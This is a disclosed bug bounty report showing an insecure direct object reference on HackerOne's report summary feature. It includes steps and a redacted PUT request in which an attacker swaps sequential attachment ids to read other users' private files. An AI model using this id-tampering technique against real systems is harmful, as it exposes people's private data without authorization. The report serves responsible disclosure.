# Attachment disclosure via summary report 

## Report Details
- **Report ID**: 2442008
- **URL**: https://hackerone.com/reports/2442008
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2024-03-30T17:53:08.294Z
- **Disclosed**: 2024-04-29T04:32:57.476Z

## Reporter
- **Username**: xklepxn
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**

Hackerone provides a form for reporting vulnerabilities to various programs. where the form supports uploading files & previews (images or videos) but is not allowed to use file ids belonging to other accounts. but with the sumary report feature I as a hacker can reveal files belonging to other users just changing the id. this is very severe.


**Description:**

I have tried to call files belonging to other accounts through the submit report, edit report form but it doesn't work it always gets the response ```"was_successful":false,```. but fortunately I can find another endpoint that is able to read files belonging to other accounts, namely in the sumary report feature.

### Steps To Reproduce
If you look at the video I attached, there I made the scenario "failed to read other account files" & "successfully read other account files" as for the steps as follows:
note : left victim right attacker

1. the attacker creates a report either draft or existing, then creates a Hacker summary 
2. then edit the summary and give the file to. 
3. intercept with intercept change the attacker file id to the victim file id
4. boom file read in markdown preview.

{F3155289}

### POC 
I don't know, uploading large files takes too long in attacth, I just put the poc via yt. : https://████ (private video)
or in gdrive, if yt can't be seen yet  : https://███████

### Optional: Supporting Material/References (Screenshots)

####raw text in video :
```
attachment leaked via add sumary report :

victim file id : 
3155239

I WILL CHANGE F3155244 TO 3155239
ATTACKER file : 

3155241
3155242
"was_successful":true, (IF FILE FROM ATTACKER) I WILL CHANGE TO VICTIM FILE
"was_successful":false, WILL FALSE 

trying leak via content : false positive
leak via sumary : successful
```
#### endpoint affected  (attachment_ids)

```
PUT /reports/████/summaries/███████ HTTP/2
Host: hackerone.com
.....all header ...
Content-Length: 908
Origin: https://hackerone.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"id":████████,"category":"researcher","content":"TESTEDIT\n\n{F3155244} ","updated_at":"2024-03-30T17:16:29.625Z","user":{"id":█████,"username":"█████","name":"██████████████","bio":"please see pdfx","cleared":false,"verified":false,"website":null,"location":"","created_at":"2024-03-29T11:27:50.077Z","url":"https://hackerone.com/██████████","hackerone_triager":false,"hackerone_employee":false,"user_type":"hacker","profile_picture_urls":{"small":"/assets/avatars/default-█████.png","medium":"/assets/avatars/default-███████.png","xtralarge":"/assets/avatars/default-███████.png"}},"can_view?":true,"can_create?":true,"attachments":[],"action_type":"publish","attachment_ids":[
3155239]}
```

## Impact

This is very bad especially the id form is only numeric in order. I can just add all the file ids of the hackerone account. I can see other people's pocs if it's a video.

## Attachments
No attachments
